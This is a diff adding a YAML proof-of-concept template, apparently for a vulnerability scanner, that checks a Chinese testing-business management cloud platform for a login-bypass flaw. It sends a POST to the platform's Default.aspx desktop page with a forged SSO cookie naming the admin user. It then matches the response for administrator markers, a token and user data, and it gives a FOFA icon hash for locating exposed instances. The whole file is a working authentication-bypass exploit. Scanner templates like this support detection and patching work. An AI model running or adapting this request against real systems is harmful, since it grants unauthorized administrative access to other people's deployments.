@@ -1,0 +1,20 @@
+id: poc-yaml-zhxht-default-aspx-login-bypass
+info:
+  name: 新华通软件检测业务管理云平台 Default.aspx 登录绕过漏洞
+  severity: high
+  tags:
+  - 权限绕过
+  finger: 检测业务管理云平台
+  fofa: icon_hash="513304261"
+variables:
+  t1: gbk_encode("管理员")
+  t2: gbk_encode("后台管理")
+requests:
+- method: POST
+  path: /Main/Desktop/Default.aspx
+  headers:
+    Cookie: '#_SSO_Login_UserID=admin'
+    Content-Length: 0
+  expression: "status_code == 200 && \ncontains(body,\"ZHXHT SOFTWARE\") &&\ncontains(body,t1)\
+    \ &&\ncontains(body,t2) &&\ncontains(body,`'token':`) &&\ncontains(body,`'userData':`)\n"
+transport: http
